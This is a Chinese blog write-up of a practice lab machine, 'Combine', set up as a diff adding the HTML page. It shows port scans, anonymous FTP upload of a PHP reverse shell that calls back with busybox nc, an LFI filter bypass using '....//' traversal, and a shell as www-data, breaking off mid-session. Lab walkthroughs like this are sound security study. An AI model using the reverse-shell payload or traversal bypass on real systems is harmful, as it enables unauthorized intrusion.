@@ -1,0 +1,840 @@
+<!doctype html><html lang=zh-cn><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>群友靶机Combine - Twansh's blog</title><link rel=icon href=/logo.png><script>(function(){localStorage.removeItem("flavor-theme");var t=window.matchMedia("(prefers-color-scheme: dark)"),e=sessionStorage.getItem("flavor-theme-override");if(e==="light"||e==="dark"){document.documentElement.setAttribute("data-theme",e);return}document.documentElement.setAttribute("data-theme",t.matches?"dark":"light")})()</script><link rel=preload as=font type=font/woff2 href=/fonts/tsanger-jinkai02/20307ec77575b65807a8b0c5b7201f43.woff2 crossorigin><link rel=preload as=style href=/fonts/tsanger-jinkai02/result.css onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/fonts/tsanger-jinkai02/result.css></noscript><link rel=stylesheet href=/scss/main.min.f9483bf4231821718c79757993df7674f414a796ac0bd206f89cc6c81e39cb27.css><meta name=description content="最近打这个有点多了，前面的坑都没去填，新的坑也还没开"><meta name=author content="Twansh"><meta name=robots content="index,follow,max-image-preview:large"><meta name=keywords content="Cyberspace Security,CTF,Web Security,Penetration Testing,Offensive,靶机"><link rel=canonical href=https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAcombine/><meta property="og:site_name" content="Twansh's blog"><meta property="og:title" content="群友靶机Combine - Twansh's blog"><meta property="og:description" content="最近打这个有点多了，前面的坑都没去填，新的坑也还没开"><meta property="og:type" content="article"><meta property="og:url" content="https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAcombine/"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://3a0.top/logo.png"><meta property="og:image:alt" content="群友靶机Combine"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="群友靶机Combine - Twansh's blog"><meta name=twitter:description content="最近打这个有点多了，前面的坑都没去填，新的坑也还没开"><meta name=twitter:image content="https://3a0.top/logo.png"><meta property="article:published_time" content="2025-10-11T10:40:00Z"><meta property="article:modified_time" content="2025-10-11T10:40:00Z"><meta property="article:section" content="Offensive"><meta property="article:tag" content="靶机"><script type=application/ld+json>{"@context":"https://schema.org","@graph":[{"@id":"https://3a0.top/#website","@type":"WebSite","description":"Cyberspace Security / CTF / Web 安全，记录学习和生活。","inLanguage":"zh-cn","name":"Twansh's blog","url":"https://3a0.top/"},{"@id":"https://3a0.top/about/#author","@type":"Person","email":"eminemgcxwlp@gmail.com","name":"Twansh","sameAs":["https://github.com/GCXWLP"],"url":"https://3a0.top/about/"},{"@id":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAcombine/#article","@type":"BlogPosting","author":{"@id":"https://3a0.top/about/#author"},"dateModified":"2025-10-11T10:40:00Z","datePublished":"2025-10-11T10:40:00Z","description":"最近打这个有点多了，前面的坑都没去填，新的坑也还没开","headline":"群友靶机Combine","image":["https://3a0.top/logo.png"],"inLanguage":"zh-cn","isPartOf":{"@id":"https://3a0.top/#website"},"keywords":["Offensive","靶机"],"mainEntityOfPage":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAcombine/","url":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAcombine/"},{"@id":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAcombine/#breadcrumb","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://3a0.top/","name":"Home","position":1},{"@type":"ListItem","item":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAcombine/","name":"群友靶机Combine","position":2}]}]}</script></head><body><nav class=navbar id=navbar><div class=navbar__inner><a class=navbar__brand href=/><span>Twansh's blog</span></a><div class=navbar__right><ul class=navbar__links id=nav-links><li><a href=/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<span>Links</span></a></li><li><a href=/travel/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
+<span>Travel</span></a></li></ul><button class=navbar__btn id=search-btn type=button aria-label=Search>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+</button>
+<button class=navbar__btn id=theme-toggle type=button aria-label="Toggle theme">
+<svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+<svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+</button>
+<button class="navbar__btn navbar__hamburger" id=hamburger type=button aria-label=Menu>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></nav><div class=site-content><div class=post-layout><article class="post-layout__content post-single"><header class=post-single__header><div class=post-single__meta><time datetime=2025-10-11 data-pagefind-meta=date[datetime]>Oct 11, 2025</time>
+<span class=sep>·</span>
+<span>17 min read</span>
+<span class=sep>·</span>
+<span>3500 words</span>
+<span class=sep>·</span>
+<a href=/categories/offensive/ class=post-single__category data-pagefind-filter=category>Offensive</a></div><h1 class=post-single__title data-pagefind-meta=title>群友靶机Combine</h1></header><div class=article-content data-pagefind-body><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# ifconfig
+</span></span><span class=line><span class=cl>eth0: <span class=nv>flags</span><span class=o>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class=m>1500</span>
+</span></span><span class=line><span class=cl>        inet 192.168.56.102  netmask 255.255.255.0  broadcast 192.168.56.255
+</span></span><span class=line><span class=cl>        inet6 fe80::20c:29ff:fe66:2ae1  prefixlen <span class=m>64</span>  scopeid 0x20&lt;link&gt;
+</span></span><span class=line><span class=cl>        ether 00:0c:29:66:2a:e1  txqueuelen <span class=m>1000</span>  <span class=o>(</span>Ethernet<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX packets <span class=m>1</span>  bytes <span class=m>590</span> <span class=o>(</span>590.0 B<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>0</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
+</span></span><span class=line><span class=cl>        TX packets <span class=m>22</span>  bytes <span class=m>3002</span> <span class=o>(</span>2.9 KiB<span class=o>)</span>
+</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>lo: <span class=nv>flags</span><span class=o>=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class=m>65536</span>
+</span></span><span class=line><span class=cl>        inet 127.0.0.1  netmask 255.0.0.0
+</span></span><span class=line><span class=cl>        inet6 ::1  prefixlen <span class=m>128</span>  scopeid 0x10&lt;host&gt;
+</span></span><span class=line><span class=cl>        loop  txqueuelen <span class=m>1000</span>  <span class=o>(</span>Local Loopback<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX packets <span class=m>8</span>  bytes <span class=m>480</span> <span class=o>(</span>480.0 B<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>0</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
+</span></span><span class=line><span class=cl>        TX packets <span class=m>8</span>  bytes <span class=m>480</span> <span class=o>(</span>480.0 B<span class=o>)</span>
+</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                                                                                                                                                                                                  
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# arp-scan -l                    
+</span></span><span class=line><span class=cl>Interface: eth0, type: EN10MB, MAC: 00:0c:29:66:2a:e1, IPv4: 192.168.56.102
+</span></span><span class=line><span class=cl>Starting arp-scan 1.10.0 with <span class=m>256</span> hosts <span class=o>(</span>https://github.com/royhills/arp-scan<span class=o>)</span>
+</span></span><span class=line><span class=cl>192.168.56.1    0a:00:27:00:00:0d       <span class=o>(</span>Unknown: locally administered<span class=o>)</span>
+</span></span><span class=line><span class=cl>192.168.56.100  08:00:27:eb:d5:0a       PCS Systemtechnik GmbH
+</span></span><span class=line><span class=cl>192.168.56.106  08:00:27:2a:4b:fd       PCS Systemtechnik GmbH
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>3</span> packets received by filter, <span class=m>0</span> packets dropped by kernel
+</span></span><span class=line><span class=cl>Ending arp-scan 1.10.0: <span class=m>256</span> hosts scanned in 1.985 seconds <span class=o>(</span>128.97 hosts/sec<span class=o>)</span>. <span class=m>3</span> responded
+</span></span><span class=line><span class=cl>                                                                                                                                                                                                  
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# nmap -sC -sV -p- 192.168.56.106
+</span></span><span class=line><span class=cl>Starting Nmap 7.95 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2025-10-13 15:13 +08
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.56.106
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00047s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65532</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span class=line><span class=cl><span class=p>|</span> ftp-syst: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   STAT: 
+</span></span><span class=line><span class=cl><span class=p>|</span> FTP server status:
+</span></span><span class=line><span class=cl><span class=p>|</span>      Connected to 192.168.56.102
+</span></span><span class=line><span class=cl><span class=p>|</span>      Logged in as ftp
+</span></span><span class=line><span class=cl><span class=p>|</span>      TYPE: ASCII
+</span></span><span class=line><span class=cl><span class=p>|</span>      No session bandwidth limit
+</span></span><span class=line><span class=cl><span class=p>|</span>      Session timeout in seconds is <span class=m>300</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>      Control connection is plain text
+</span></span><span class=line><span class=cl><span class=p>|</span>      Data connections will be plain text
+</span></span><span class=line><span class=cl><span class=p>|</span>      At session startup, client count was <span class=m>4</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span class=line><span class=cl><span class=p>|</span>_End of status
+</span></span><span class=line><span class=cl><span class=p>|</span> ftp-anon: Anonymous FTP login allowed <span class=o>(</span>FTP code 230<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_drwxrwxrwx    <span class=m>2</span> <span class=m>65534</span>    <span class=m>65534</span>        <span class=m>4096</span> Oct <span class=m>11</span> 02:56 upload <span class=o>[</span>NSE: writeable<span class=o>]</span>
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 <span class=o>(</span>protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.62 <span class=o>((</span>Debian<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.62 <span class=o>(</span>Debian<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>UTF-8<span class=o>)</span>.
+</span></span><span class=line><span class=cl>MAC Address: 08:00:27:2A:4B:FD <span class=o>(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span class=o>)</span>
+</span></span><span class=line><span class=cl>Service Info: OSs: Unix, Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 21.15 seconds
+</span></span></code></pre></div><p>信息收集起手，出现21端口的ftp服务，而且是可以匿名登录的，这里我直接匿名登录看看</p><p>登录上去之后进行信息收集，发现.pwd文件(那个shell.php是我自己写的，put上去的，并非题目自带)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# ftp 192.168.56.106                                                                                        
+</span></span><span class=line><span class=cl>Connected to 192.168.56.106.
+</span></span><span class=line><span class=cl><span class=m>220</span> <span class=o>(</span>vsFTPd 3.0.3<span class=o>)</span>
+</span></span><span class=line><span class=cl>Name <span class=o>(</span>192.168.56.106:kali<span class=o>)</span>: ftp
+</span></span><span class=line><span class=cl><span class=m>230</span> Login successful.
+</span></span><span class=line><span class=cl>Remote system <span class=nb>type</span> is UNIX.
+</span></span><span class=line><span class=cl>Using binary mode to transfer files.
+</span></span><span class=line><span class=cl>ftp&gt; ls -al
+</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>27431<span class=p>|</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>150</span> Here comes the directory listing.
+</span></span><span class=line><span class=cl>dr-xr-xr-x    <span class=m>3</span> <span class=m>65534</span>    <span class=m>65534</span>        <span class=m>4096</span> Oct <span class=m>10</span> 13:01 .
+</span></span><span class=line><span class=cl>dr-xr-xr-x    <span class=m>3</span> <span class=m>65534</span>    <span class=m>65534</span>        <span class=m>4096</span> Oct <span class=m>10</span> 13:01 ..
+</span></span><span class=line><span class=cl>drwxrwxrwx    <span class=m>2</span> <span class=m>65534</span>    <span class=m>65534</span>        <span class=m>4096</span> Oct <span class=m>11</span> 02:56 upload
+</span></span><span class=line><span class=cl><span class=m>226</span> Directory send OK.
+</span></span><span class=line><span class=cl>ftp&gt; <span class=nb>cd</span> upload
+</span></span><span class=line><span class=cl><span class=m>250</span> Directory successfully changed.
+</span></span><span class=line><span class=cl>ftp&gt; ls -al
+</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>59758<span class=p>|</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>150</span> Here comes the directory listing.
+</span></span><span class=line><span class=cl>drwxrwxrwx    <span class=m>2</span> <span class=m>65534</span>    <span class=m>65534</span>        <span class=m>4096</span> Oct <span class=m>11</span> 02:56 .
+</span></span><span class=line><span class=cl>dr-xr-xr-x    <span class=m>3</span> <span class=m>65534</span>    <span class=m>65534</span>        <span class=m>4096</span> Oct <span class=m>10</span> 13:01 ..
+</span></span><span class=line><span class=cl>-rw-r--r--    <span class=m>1</span> <span class=m>0</span>        <span class=m>0</span>              <span class=m>16</span> Oct <span class=m>10</span> 13:08 .pwd
+</span></span><span class=line><span class=cl>-rw-r--r--    <span class=m>1</span> <span class=m>106</span>      <span class=m>113</span>            <span class=m>31</span> Oct <span class=m>11</span> 02:56 shell.php
+</span></span><span class=line><span class=cl><span class=m>226</span> Directory send OK.
+</span></span><span class=line><span class=cl>ftp&gt; cat .pwd
+</span></span><span class=line><span class=cl>?Invalid command.
+</span></span><span class=line><span class=cl>ftp&gt; cat -A .pwd
+</span></span><span class=line><span class=cl>?Invalid command.
+</span></span><span class=line><span class=cl>ftp&gt; get .pwd
+</span></span><span class=line><span class=cl>local: .pwd remote: .pwd
+</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>31001<span class=p>|</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>150</span> Opening BINARY mode data connection <span class=k>for</span> .pwd <span class=o>(</span><span class=m>16</span> bytes<span class=o>)</span>.
+</span></span><span class=line><span class=cl>100% <span class=p>|</span>*****************************************************************************************************************************************************<span class=p>|</span>    <span class=m>16</span>        7.55 KiB/s    00:00 ETA
+</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
+</span></span><span class=line><span class=cl><span class=m>16</span> bytes received in 00:00 <span class=o>(</span>5.67 KiB/s<span class=o>)</span>
+</span></span></code></pre></div><p>读取.pwd文件</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# cat .pwd   
+</span></span><span class=line><span class=cl>/srv/ftp/upload
+</span></span></code></pre></div><p>发现一条路径，这个就是真实的在服务器上的路径，我在upload目录下写的shell其实就有用武之地了，毕竟总有方法可以访问得到的嘛</p><p>写入一个反弹shell的php脚本备用</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# cat shell.php
+</span></span><span class=line><span class=cl>&lt;?php system<span class=o>(</span><span class=s1>&#39;busybox nc 192.168.56.102 7777 -e sh&#39;</span><span class=o>)</span><span class=p>;</span> ?&gt;
+</span></span></code></pre></div><p>然后就通过put上传ftp下的upload目录</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ftp&gt; put shell.php
+</span></span><span class=line><span class=cl>local: shell.php remote: shell.php
+</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>58936<span class=p>|</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>150</span> Ok to send data.
+</span></span><span class=line><span class=cl>100% <span class=p>|</span>*****************************************************************************************************************************************************<span class=p>|</span>    <span class=m>58</span>      475.97 KiB/s    00:00 ETA
+</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
+</span></span><span class=line><span class=cl><span class=m>58</span> bytes sent in 00:00 <span class=o>(</span>36.97 KiB/s<span class=o>)</span>
+</span></span></code></pre></div><p>接下来去看web页面，注释提示是LFI，那么估计就是让我们用LFI来访问ftp上传的文件，然后getshell了</p><p>那么需要一个LFI的参数，使用ffuf进行爆破</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# ffuf -w /home/kali/桌面/1.txt:FUZZ -u <span class=s2>&#34;http://192.168.56.106?FUZZ=../../../etc/passwd&#34;</span> --fs <span class=m>14</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=s1>&#39;___\       
+</span></span></span><span class=line><span class=cl><span class=s1>       /\ \__/ /\ \__/  __  __  /\ \__/       
+</span></span></span><span class=line><span class=cl><span class=s1>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+</span></span></span><span class=line><span class=cl><span class=s1>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+</span></span></span><span class=line><span class=cl><span class=s1>         \ \_\   \ \_\  \ \____/  \ \_\       
+</span></span></span><span class=line><span class=cl><span class=s1>          \/_/    \/_/   \/___/    \/_/       
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>       v2.1.0-dev
+</span></span></span><span class=line><span class=cl><span class=s1>________________________________________________
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1> :: Method           : GET
+</span></span></span><span class=line><span class=cl><span class=s1> :: URL              : http://192.168.56.106?FUZZ=../../../etc/passwd
+</span></span></span><span class=line><span class=cl><span class=s1> :: Wordlist         : FUZZ: /home/kali/桌面/1.txt
+</span></span></span><span class=line><span class=cl><span class=s1> :: Follow redirects : false
+</span></span></span><span class=line><span class=cl><span class=s1> :: Calibration      : false
+</span></span></span><span class=line><span class=cl><span class=s1> :: Timeout          : 10
+</span></span></span><span class=line><span class=cl><span class=s1> :: Threads          : 40
+</span></span></span><span class=line><span class=cl><span class=s1> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span></span><span class=line><span class=cl><span class=s1> :: Filter           : Response size: 14
+</span></span></span><span class=line><span class=cl><span class=s1>________________________________________________
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>:: Progress: [5846/5846] :: Job [1/1] :: 167 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+</span></span></span><span class=line><span class=cl><span class=s1>                                                                                                                                                                                   
+</span></span></span><span class=line><span class=cl><span class=s1>┌──(root㉿kali)-[~]
+</span></span></span><span class=line><span class=cl><span class=s1>└─# ffuf -w /home/kali/桌面/1.txt:FUZZ -u &#34;http://192.168.56.106?FUZZ=....//....//....//etc/passwd&#34; --fs 14  
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>        /&#39;</span>___<span class=se>\ </span> /<span class=s1>&#39;___\           /&#39;</span>___<span class=se>\ </span>      
+</span></span><span class=line><span class=cl>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/       
+</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\ </span>     
+</span></span><span class=line><span class=cl>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/      
+</span></span><span class=line><span class=cl>         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\ </span>      
+</span></span><span class=line><span class=cl>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/       
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>       v2.1.0-dev
+</span></span><span class=line><span class=cl>________________________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> :: Method           : GET
+</span></span><span class=line><span class=cl> :: URL              : http://192.168.56.106?FUZZ<span class=o>=</span>....//....//....//etc/passwd
+</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: /home/kali/桌面/1.txt
+</span></span><span class=line><span class=cl> :: Follow redirects : <span class=nb>false</span>
+</span></span><span class=line><span class=cl> :: Calibration      : <span class=nb>false</span>
+</span></span><span class=line><span class=cl> :: Timeout          : <span class=m>10</span>
+</span></span><span class=line><span class=cl> :: Threads          : <span class=m>40</span>
+</span></span><span class=line><span class=cl> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class=line><span class=cl> :: Filter           : Response size: <span class=m>14</span>
+</span></span><span class=line><span class=cl>________________________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>file                    <span class=o>[</span>Status: 200, Size: 1465, Words: 16, Lines: 30, Duration: 7ms<span class=o>]</span>
+</span></span><span class=line><span class=cl>:: Progress: <span class=o>[</span>5846/5846<span class=o>]</span> :: Job <span class=o>[</span>1/1<span class=o>]</span> :: <span class=m>142</span> req/sec :: Duration: <span class=o>[</span>0:00:04<span class=o>]</span> :: Errors: <span class=m>0</span> ::
+</span></span></code></pre></div><p>常规的路径被过滤了<br>参考这篇<a href=https://blog.csdn.net/qingzhantianxia/article/details/128204437>路径穿越</a>的文章进行绕过，拿到参数名file</p><p>接下来直接访问+反弹shell即可</p><p>然后web端访问?file=&mldr;.//&mldr;.//&mldr;.///srv/ftp/upload/shell.php<br>成功触发到反弹shell</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# nc -lnvp <span class=m>7777</span>
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>7777</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>192.168.56.102<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>192.168.56.106<span class=o>]</span> <span class=m>60816</span>
+</span></span><span class=line><span class=cl>script /dev/null -c bash
+</span></span><span class=line><span class=cl>Script started, file is /dev/null
+</span></span><span class=line><span class=cl>www-data@Combine:/var/www/html$ ls
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>index.php
+</span></span><span class=line><span class=cl>www-data@Combine:/var/www/html$ <span class=nb>cd</span> ..
+</span></span><span class=line><span class=cl><span class=nb>cd</span> ..
+</span></span><span class=line><span class=cl>www-data@Combine:/var/www$ <span class=nb>cd</span> /
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /
+</span></span><span class=line><span class=cl>www-data@Combine:/$ ls
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>bin   home            lib32       media  root  sys  vmlinuz
+</span></span><span class=line><span class=cl>boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
+</span></span><span class=line><span class=cl>dev   initrd.img.old  libx32      opt    sbin  usr
+</span></span><span class=line><span class=cl>etc   lib             lost+found  proc   srv   var
+</span></span><span class=line><span class=cl>www-data@Combine:/$ <span class=nb>cd</span> home
+</span></span><span class=line><span class=cl><span class=nb>cd</span> home
+</span></span><span class=line><span class=cl>www-data@Combine:/home$ ls
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>dashamao
+</span></span><span class=line><span class=cl>www-data@Combine:/home$ cat dashamao
+</span></span><span class=line><span class=cl>cat dashamao
+</span></span><span class=line><span class=cl>cat: dashamao: Is a directory
+</span></span><span class=line><span class=cl>www-data@Combine:/home$ <span class=nb>cd</span> dashamao
+</span></span><span class=line><span class=cl><span class=nb>cd</span> dashamao
+</span></span><span class=line><span class=cl>www-data@Combine:/home/dashamao$ ls
+</span></span><span class=line><span class=cl>ls
